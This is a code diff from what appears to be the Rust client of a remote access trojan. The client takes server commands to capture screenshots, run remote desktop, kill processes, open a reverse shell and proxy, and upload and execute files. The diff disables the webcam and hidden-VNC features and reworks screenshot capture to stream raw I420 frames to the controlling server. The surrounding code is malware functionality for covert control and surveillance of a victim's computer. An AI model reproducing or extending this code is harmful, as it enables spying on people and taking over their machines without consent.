@@ -2,8 +2,8 @@ use crate::features::other::{take_screenshot, client_info, visit_website, show_m
 use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process};
 use crate::features::system_commands::system_commands;
-use crate::features::webcam::take_webcam;
-use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
+// use crate::features::webcam::take_webcam;
+// use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -51,7 +51,37 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
                 match display.parse::<i32>() {
                     Ok(display_id) => {
-                        let screenshot_data = take_screenshot(display_id);
+                        // Take screenshot and ensure dimensions are even for YUV420
+                        let (width, height, bgra) = take_screenshot(display_id);
+                        
+                        // Ensure we got valid data
+                        if width < 2 || height < 2 || bgra.len() != width * height * 4 {
+                            println!("Invalid screenshot dimensions or data size");
+                            continue;
+                        }
+                        
+                        // Allocate YUV buffer with exact size
+                        let y_size = width * height;
+                        let uv_size = (width / 2) * (height / 2);
+                        let mut i420_buffer = Vec::with_capacity(y_size + 2 * uv_size);
+
+                        // Convert to I420
+                        common::convert::bgra_to_i420(width, height, &bgra, &mut i420_buffer);
+                        
+                        // Verify I420 buffer has expected size
+                        if i420_buffer.len() != y_size + 2 * uv_size {
+                            println!("I420 conversion failed: wrong buffer size (expected {}, got {})", 
+                                  y_size + 2 * uv_size, i420_buffer.len());
+                            continue;
+                        }
+
+                        // Create packet and send raw I420 data
+                        let screenshot_data = ScreenshotData {
+                            width: width as u32,
+                            height: height as u32,
+                            data: i420_buffer,  // Send raw I420 data
+                        };
+
                         match send_packet(ServerboundPacket::ScreenshotResult(screenshot_data)).await {
                             Ok(_) => println!("Sent screenshot to server"),
                             Err(e) => println!("Error sending screenshot: {}", e),
@@ -120,13 +150,13 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
-            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
+            // Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
             
-            Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
+            // Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
             
-            Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
+            // Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
             
-            Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
+            // Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
             
             Ok(Some(ClientboundPacket::UploadAndExecute(file_data))) => file_manager.upload_and_execute(file_data).await,
             
@@ -143,7 +173,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
-                stop_hvnc();
+                // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
@@ -153,7 +183,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
-                stop_hvnc();
+                // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
